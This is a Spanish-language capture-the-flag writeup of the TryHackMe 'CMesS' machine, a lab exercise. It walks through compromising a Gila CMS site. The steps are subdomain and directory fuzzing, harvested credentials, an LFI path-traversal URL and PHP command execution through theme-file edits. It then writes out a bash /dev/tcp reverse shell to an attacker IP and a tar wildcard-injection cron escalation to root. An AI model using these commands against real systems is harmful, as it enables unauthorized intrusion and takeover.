---
layout: single
title: Writeup THM - Maquina CMesS
comments: true
excerpt: "La maquina CMesS es una maquina linux - Medium, encontramos una pagina web donde encontramos que se esta utilizando un cms llamado Gila CMS donde encontramos un subdominio dev donde encontramos credenciales del usuario andre, usamos dichas credenciales para acceder al panel de control de Gila CMS y aprovechamos para modificar los achivos php del cms para poder ejecutar comandos y obtenemos una reverse shell con www-data. Ejecutamos linpeas y encontramos crendeciales en un archivo password.bak. Por ultimo escalamos privilegios a root abusando de una tarea cron que ejecuta tar cada cierto tiempo."
date: 2022-02-11
classes: wide
header:
  teaser: /assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled.png
  teaser_home_page: true
categories:
  - TryHackMe
tags:
  - OSCP  
  - Hacking
  - Medium
  - vhost
  - Gila CMS
  - tar
  - wfuzz
  - ffuf
---

# CMesS
<p align="center">
<img src="/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina CMesS es una maquina linux - Medium, encontramos una pagina web donde encontramos que se esta utilizando un cms llamado Gila CMS donde encontramos un subdominio dev donde encontramos credenciales del usuario andre, usamos dichas credenciales para acceder al panel de control de Gila CMS y aprovechamos para modificar los achivos php del cms para poder ejecutar comandos y obtenemos una reverse shell con www-data. Ejecutamos linpeas y encontramos crendeciales en un archivo password.bak. Por ultimo escalamos privilegios a root abusando de una tarea cron que ejecuta tar cada cierto tiempo.
</div>

## Nmap Scan

```bash
# Nmap 7.92 scan initiated Fri Feb 11 17:50:39 2022 as: nmap -sC -sV -p22,80 -oN targeted -Pn -vvv 10.10.215.235
Nmap scan report for cmess.thm (10.10.215.235)
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-11 17:50:40 -05 for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 11 17:50:53 2022 -- 1 IP address (1 host up) scanned in 13.54 seconds
```

## Pagina web - Port 80

antes de empezar la room nos dice que debemos hacer esto:

```bash
echo "10.10.215.235 cmess.thm" >> /etc/hosts
```

ahora si revisamos la pagina web y vemos usa un cms llamado Gila CMS

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%201.png)

si revisamos robots.txt encontramos los siguientes directorios por el momento no revisare esto

```bash
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

tambien busco los subdominios  con wfuz y zencontramos el subdominio dev

```bash
❯ wfuzz -u http://10.10.215.235/ -H "Host: FUZZ.cmess.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 290 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.215.235/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"                                                                                                   
000009532:   400        12 L     53 W       422 Ch      "#www"                                                                                                  
000010581:   400        12 L     53 W       422 Ch      "#mail"
```

este subdominio tambien agregamos al /etc/hosts

```bash
echo "10.10.215.235 dev.cmess.thm" >> /etc/hosts
```

si entramos a revisar dicho subdominio encontramos unos logs donde el usuario andre@cmess.thm pide a support@cmess.thm resetear su password dando como respuesta que su password es ahora KPFTN_f2yxe%

```bash
http://dev.cmess.thm/
```

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%202.png)

por lo tanto encontramos tenemos estas credenciales

```bash
andre@cmess.thm:KPFTN_f2yxe%
```

al escanear directorios encontramos el directorio admin

```bash
cmess # ❯ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.24.30/FUZZ -e .php,.html,.js,.txt,.zip,.bak,.save -fl 10,103

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.24.30/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .js .txt .zip .bak .save 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response lines: 10,103
________________________________________________

                        [Status: 200, Size: 3871, Words: 522, Lines: 108]
0                       [Status: 200, Size: 3857, Words: 522, Lines: 108]
about                   [Status: 200, Size: 3357, Words: 372, Lines: 93]
About                   [Status: 200, Size: 3343, Words: 372, Lines: 93]
admin                   [Status: 200, Size: 1582, Words: 377, Lines: 42]
api                     [Status: 200, Size: 0, Words: 1, Lines: 1]
author                  [Status: 200, Size: 3596, Words: 419, Lines: 102]
blog                    [Status: 200, Size: 3857, Words: 522, Lines: 108]
category                [Status: 200, Size: 3868, Words: 522, Lines: 110]
feed                    [Status: 200, Size: 735, Words: 37, Lines: 22]
fm                      [Status: 200, Size: 0, Words: 1, Lines: 1]
index                   [Status: 200, Size: 3857, Words: 522, Lines: 108]
Index                   [Status: 200, Size: 3857, Words: 522, Lines: 108]
login                   [Status: 200, Size: 1582, Words: 377, Lines: 42]
```

que contiene un login, usamos estas credenciales para acceder al panel de control de dicho cms

```bash
http://cmess.thm/admin/
```

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%203.png)

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%204.png)

encontramos la version de Gila CMS version 1.10.9 y buscamos un exploit relacionado a dicha version

```bash
cmess # ❯ searchsploit gila                                 
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gila CMS 1.11.8 - 'query' SQL Injection                                                                                                | php/webapps/48590.py
Gila CMS 1.9.1 - Cross-Site Scripting                                                                                                  | php/webapps/46557.txt
Gila CMS 2.0.0 - Remote Code Execution (Unauthenticated)                                                                               | php/webapps/49412.py
Gila CMS < 1.11.1 - Local File Inclusion                                                                                               | multiple/webapps/47407.txt
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

descargamos el exploit Gila CMS < 1.11.1 - Local File Inclusion

```bash
cmess # ❯ searchsploit -m 47407
  Exploit: Gila CMS < 1.11.1 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/47407
     Path: /usr/share/exploitdb/exploits/multiple/webapps/47407.txt
File Type: ASCII text

Copied to: /mnt/Pentester/Certificaciones/OSCP/WorkFolder/Plataformas/thm/cmess/47407.txt
```

```bash
cmess # ❯ cat 47407.txt                            
# Exploit Title: Authenticated Local File Inclusion(LFI) in GilaCMS
# Google Dork: N/A
# Date: 04-08-2019
# Exploit Author: Sainadh Jamalpur
# Vendor Homepage: https://github.com/GilaCMS/gila
# Software Link: https://github.com/GilaCMS/gila
# Version: 1.10.9
# Tested on: XAMPP version 3.2.2 in Windows 10 64bit,
# CVE : CVE-2019-16679

*********** *Steps to reproduce the Vulnerability* *************

Login into the application as an admin user or equivalent user and go the
below link

http://localhost/gilacms/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts
```

intente explotar dicha vulnerabilidad pero solo pude acceder a directorios que antes no estaba permitido

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%205.png)

Sin embargo podemos irnos a la carpeta themes elegir gila-blog y modificar alguna archivo en mi caso elegire footer.php, la ruta seria la siguiente

```bash
http://cmess.thm/admin/fm?f=themes/gila-blog/footer.php
```

agregaremos codigo php para ver si podemos ejecutar comandos

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%206.png)

revisamos y efectivamente podemos ejecutar comandos en la maquina victima

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%207.png)

## Reverse shell

para empezar dejaremos el puerto 443 en escucha con netcat

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%208.png)

nuestro payload sera el siguiente

```bash
/bin/bash -i >& /dev/tcp/10.9.132.249/443 0>&1
```

pero lo mandaremos de esta manera

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%209.png)

obteniendo una reverse shell exitosa, solo upgradear tty shell interactiva

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%2010.png)

dejaremos un servidor web en python

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%2011.png)

descargamos en la maquina victima, damos permisos y ejecutamos linpeas.sh 

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%2012.png)

linpeas nos arroja que existe un archivo donde contiene el password de andres 

```bash
www-data@cmess:/var/www/html$ cat /opt/.password.bak 
andres backup password
UQfsdCB7aAP6
```

nos logueamos con el usuario andres con las credenciales encontradas

```bash
www-data@cmess:/var/www/html$ su andre
Password: 
andre@cmess:/var/www/html$ whoami
andre
andre@cmess:/var/www/html$ id
uid=1000(andre) gid=1000(andre) groups=1000(andre)
andre@cmess:/var/www/html$
```

## Escalacion de privilegios

ejecutamos linpeas y vemos que nos arroja que se esta ejecutando una tarea cada cierto tiempo y esto lo comprobamos de la siguiente manera

```bash
andre@cmess:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

vemos que la tarea nos manda al directorio /home/andre/backup y comprime con tar todo lo que contiene dicho directorio. Por lo tanto lei este articulo que me servira para escalar privilegios

```bash
https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
```

asi lo hare de la siguiente manera

```bash
andre@cmess:~/backup$ echo 'chmod u+s /bin/bash' > test.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh test.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
```

esperamos un rato y vemos si se ejecuto la tarea y le dio permisos de suid al binario bash

```bash
andre@cmess:~/backup$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

![Untitled](/assets/images/2022-02-12-writeup-maquina-thm-cmess/Untitled%2013.png)

y nos volvemos root de la siguiente manera

```bash
andre@cmess:~/backup$ /bin/bash -p
bash-4.3# id
uid=1000(andre) gid=1000(andre) euid=0(root) groups=1000(andre)
bash-4.3# whoami
root
bash-4.3#
```

gracias por leer este writeup, nos vemos AbelJM.